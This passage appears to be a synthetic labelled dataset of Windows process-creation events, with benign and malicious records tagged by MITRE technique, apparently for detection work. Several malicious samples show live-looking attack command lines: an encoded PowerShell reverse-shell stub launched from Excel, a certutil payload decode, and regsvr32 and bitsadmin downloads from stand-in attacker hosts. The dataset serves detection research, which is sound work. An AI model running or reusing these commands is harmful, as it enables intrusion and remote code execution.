  {
    "UtcTime": "2024-07-05T03:09:06.168Z",
    "ProcessGuid": "{FCF0B48F-3FDE-4782-A22D-A563DC456174}",
    "ProcessId": 30462,
    "Image": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "CommandLine": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 31543,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T16:47:56.139Z",
    "ProcessGuid": "{7085CBF1-180D-4B56-8063-C44E10BDFDFE}",
    "ProcessId": 57624,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 5575,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T10:23:44.144Z",
    "ProcessGuid": "{FE327C74-7540-456E-B397-BE5B7CE21940}",
    "ProcessId": 34477,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 26458,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T10:53:03.707Z",
    "ProcessGuid": "{86515B9E-DB22-4760-822B-E0DF114D97CE}",
    "ProcessId": 52403,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe devmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 20342,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T19:51:44.530Z",
    "ProcessGuid": "{F7F85B02-3A5D-4F0F-9788-9336B18482B5}",
    "ProcessId": 31444,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 4291,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T11:50:04.353Z",
    "ProcessGuid": "{024F43B2-56EC-4D22-AF8E-9F4960733C2C}",
    "ProcessId": 16802,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 49034,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T22:07:54.670Z",
    "ProcessGuid": "{50B2D75C-C38B-4306-AC48-C37DFFD6301A}",
    "ProcessId": 43658,
    "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "CommandLine": "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 58521,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:56:54.432Z",
    "ProcessGuid": "{B6416733-660C-41C7-83AF-5050690B764F}",
    "ProcessId": 53973,
    "Image": "C:\\Windows\\System32\\eventvwr.exe",
    "CommandLine": "eventvwr.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 1836,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T08:44:21.836Z",
    "ProcessGuid": "{7B42B107-1879-4F63-A93A-E070EA509253}",
    "ProcessId": 8903,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-WmiObject Win32_OperatingSystem | Select Caption, Version\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 57383,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T14:28:04.648Z",
    "ProcessGuid": "{DE4C6845-3BD0-47BB-AAA7-6FE7993D73BC}",
    "ProcessId": 53074,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-EventLog -LogName System -Newest 50\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 58679,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:45:10.318Z",
    "ProcessGuid": "{DA228046-6CA1-42B1-988D-9AE6846AFA59}",
    "ProcessId": 37099,
    "Image": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "CommandLine": "Code.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 1896,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T20:48:53.431Z",
    "ProcessGuid": "{F2318017-43E5-4203-ADBC-C99908F66AD2}",
    "ProcessId": 17532,
    "Image": "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 55716,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T15:44:31.376Z",
    "ProcessGuid": "{4B362883-246E-4D18-9883-9DA16ED687A3}",
    "ProcessId": 61575,
    "Image": "C:\\Windows\\System32\\SearchIndexer.exe",
    "CommandLine": "C:\\Windows\\System32\\SearchIndexer.exe /Embedding",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 53251,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T08:28:17.214Z",
    "ProcessGuid": "{BC4FFCBB-1021-4780-A5A9-2698CF2739D7}",
    "ProcessId": 50885,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Installers\\app_setup_6.2.40.msi /quiet",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 51694,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:43:36.451Z",
    "ProcessGuid": "{48F7E680-AA93-4256-A7EB-FF647F798C91}",
    "ProcessId": 31256,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 51425,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:41:22.315Z",
    "ProcessGuid": "{84ABD460-D447-4DE3-8CF9-DB2D4DF87F31}",
    "ProcessId": 18141,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c tasklist",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 24569,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:38:34.172Z",
    "ProcessGuid": "{16AC70E8-68A1-40E1-898F-689FF15503DF}",
    "ProcessId": 22210,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Process | Sort-Object CPU -Descending | Select -First 10\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 65159,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:49:05.254Z",
    "ProcessGuid": "{BB3A8415-860F-4DEA-86B2-9E29263174D8}",
    "ProcessId": 11334,
    "Image": "C:\\Windows\\System32\\conhost.exe",
    "CommandLine": "conhost.exe 0xffffffff -ForceV1",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 33762,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T12:49:18.721Z",
    "ProcessGuid": "{123F862C-A388-400F-AABA-7D711270F1B7}",
    "ProcessId": 14584,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net use Z: \\\\fileserver\\share",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 46235,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:43:43.607Z",
    "ProcessGuid": "{51F9D505-D3AC-44CB-BBB8-2DA52AC468DF}",
    "ProcessId": 32891,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 35533,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T15:36:15.713Z",
    "ProcessGuid": "{A450D23A-1455-4FA3-8279-BB884B773752}",
    "ProcessId": 15801,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ping google.com",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 20659,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T20:19:44.371Z",
    "ProcessGuid": "{8D03A306-606A-44BC-8865-383BEB5F5E04}",
    "ProcessId": 10110,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" /n document15.docm",
    "ParentProcessId": 54545,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1204.002",
    "technique_name": "Office Macro Execution",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T17:46:36.011Z",
    "ProcessGuid": "{632DD9BD-98A6-4489-8FA0-F71EF70BEBA2}",
    "ProcessId": 18141,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c dir C:\\Users",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 43839,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T13:08:47.799Z",
    "ProcessGuid": "{E50B5924-8BC8-4244-BC2B-6E88CB595224}",
    "ProcessId": 58243,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ChildItem -Path C:\\Logs -Recurse -Filter *.log\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 18613,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T10:05:31.865Z",
    "ProcessGuid": "{6FAA35B7-9F3C-4E20-A3B1-FD517F0B3368}",
    "ProcessId": 29436,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ping 8.8.8.8",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 43264,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T00:45:44.360Z",
    "ProcessGuid": "{C6A5CD71-62DD-4736-AD74-2AA3D79AABFC}",
    "ProcessId": 63099,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 38201,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T14:42:24.693Z",
    "ProcessGuid": "{FCCB86AC-2447-4CEE-ABFA-DE1C84EDE083}",
    "ProcessId": 50029,
    "Image": "C:\\Windows\\System32\\calc.exe",
    "CommandLine": "calc.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 60166,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:20:20.668Z",
    "ProcessGuid": "{3F8FCE42-CF64-4D6C-B11D-49EDC9B275CA}",
    "ProcessId": 20094,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --type=renderer --field-trial-handle=12345",
    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
    "ParentProcessId": 47558,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T15:20:26.155Z",
    "ProcessGuid": "{23F04F59-0C09-4DD4-81E9-CED57444EC51}",
    "ProcessId": 28063,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c nslookup corp.local",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 46252,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T15:37:36.965Z",
    "ProcessGuid": "{3A8F43AA-5BF1-4426-BB22-AEE80BE253CF}",
    "ProcessId": 44722,
    "Image": "C:\\Windows\\regedit.exe",
    "CommandLine": "regedit.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 47538,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T14:56:43.137Z",
    "ProcessGuid": "{6299306F-67CF-433E-8118-E406EBDD5BB2}",
    "ProcessId": 23461,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Temp\\update_9.9.67.msi /passive /norestart",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 60073,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T12:13:42.733Z",
    "ProcessGuid": "{EE00218B-78B7-4D33-BDF4-EF1EE79846FF}",
    "ProcessId": 21590,
    "Image": "C:\\Windows\\System32\\calc.exe",
    "CommandLine": "calc.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 16642,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T11:14:46.134Z",
    "ProcessGuid": "{C37874EA-C3D7-4594-8735-D16906523C9D}",
    "ProcessId": 14840,
    "Image": "C:\\Users\\sysadmin\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 49108,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T16:48:11.519Z",
    "ProcessGuid": "{FC01D87F-9342-4A51-ACCB-825422D043BA}",
    "ProcessId": 60809,
    "Image": "C:\\Windows\\System32\\calc.exe",
    "CommandLine": "calc.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 7973,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T09:50:51.510Z",
    "ProcessGuid": "{98A5BC1A-8543-492A-A5C1-BC953562A774}",
    "ProcessId": 25339,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 31388,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T04:25:42.379Z",
    "ProcessGuid": "{E4723FA0-070E-46A1-87C3-AE81CB040527}",
    "ProcessId": 9666,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil -decode C:\\Users\\Public\\encoded5553.txt C:\\Users\\Public\\decoded3947.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 64442,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1140",
    "technique_name": "Certutil Base64 Decode",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T08:45:55.694Z",
    "ProcessGuid": "{3C0ED220-60FC-4723-9390-A9415FCAE3D4}",
    "ProcessId": 35394,
    "Image": "C:\\Users\\sysadmin\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 51300,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T21:37:31.055Z",
    "ProcessGuid": "{00E1CE58-6B44-49A9-9A28-F2DCEDFCD2C4}",
    "ProcessId": 59359,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s /n /u /i:http://malware-cdn3894.io/file891.sct scrobj.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 29564,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.010",
    "technique_name": "Regsvr32 Squiblydoo",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T10:28:34.495Z",
    "ProcessGuid": "{E40B84A9-63D1-4AB9-B732-81D79EB9C846}",
    "ProcessId": 23618,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 22786,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T13:51:35.628Z",
    "ProcessGuid": "{2D1604B2-FDF1-4A47-BA65-6A4C65D554C5}",
    "ProcessId": 46682,
    "Image": "C:\\Windows\\System32\\odbcad32.exe",
    "CommandLine": "odbcad32.exe",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentProcessId": 45863,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T19:38:54.413Z",
    "ProcessGuid": "{4DEE51B0-6B0D-4376-B339-815414042F8E}",
    "ProcessId": 9045,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer job1766 /download /priority high http://c2-server6478.io/sys605.exe C:\\Users\\Public\\sys948.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 16261,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1197",
    "technique_name": "BITSAdmin Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T12:05:41.369Z",
    "ProcessGuid": "{95EAC93A-29BD-477E-BCF4-040DAAB666A9}",
    "ProcessId": 17409,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Disk | Get-Partition | Get-Volume\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 6401,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T13:37:31.791Z",
    "ProcessGuid": "{F4DBEA1F-D56D-40A3-9608-5B863AC88445}",
    "ProcessId": 51848,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Set-ExecutionPolicy RemoteSigned -Scope CurrentUser\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 13807,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T15:51:54.165Z",
    "ProcessGuid": "{F3C087EE-856B-4437-98DD-5AD27CDA9034}",
    "ProcessId": 41753,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i http://deploy.corp.local/package44.msi /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 14579,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T04:38:57.527Z",
    "ProcessGuid": "{7739C383-CCA8-47F1-93D1-75F6265D1A6D}",
    "ProcessId": 10160,
    "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 22493,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:16:02.725Z",
    "ProcessGuid": "{5897CB37-6D5C-458E-977C-3D1B71561E8A}",
    "ProcessId": 29577,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 1110,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T09:58:06.536Z",
    "ProcessGuid": "{97905ED6-14C8-4B07-9D4A-6D6104B370A1}",
    "ProcessId": 10758,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c arp -a",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 16792,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T14:52:57.123Z",
    "ProcessGuid": "{E7277370-98BE-45D6-BA64-A45EB2412E01}",
    "ProcessId": 4399,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\Defrag\\ScheduledDefrag\"",
